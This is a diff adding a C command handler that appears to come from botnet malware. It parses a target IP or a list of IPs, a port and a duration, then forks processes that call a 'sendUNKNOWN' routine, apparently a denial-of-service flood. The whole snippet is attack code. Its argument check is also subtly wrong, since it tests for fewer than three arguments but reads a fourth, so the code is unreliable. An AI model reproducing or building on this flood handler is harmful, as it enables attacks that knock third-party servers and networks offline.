@@ -1,0 +1,37 @@
+	if (!strcmp(argv[0], "UNKNOWN"))
+	{
+		if (argc < 3 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
+		{
+			return;
+		}
+
+
+		unsigned char *ip = argv[1];
+		int port = atoi(argv[2]);
+		int time = atoi(argv[3]);
+
+		if (strstr(ip, ",") != NULL)
+		{
+			unsigned char *lmfao = strtok(ip, ",");
+
+			while (lmfao != NULL)
+			{
+				if (!listFork())
+				{
+					sendUNKNOWN(lmfao, port, time);
+					_exit(0);
+				}
+					lmfao = strtok(NULL, ",");
+			}
+		}
+		else
+		{
+			if (listFork())
+			{
+				return;
+			}
+
+			sendUNKNOWN(ip, port, time);
+			_exit(0);
+		}
+	}
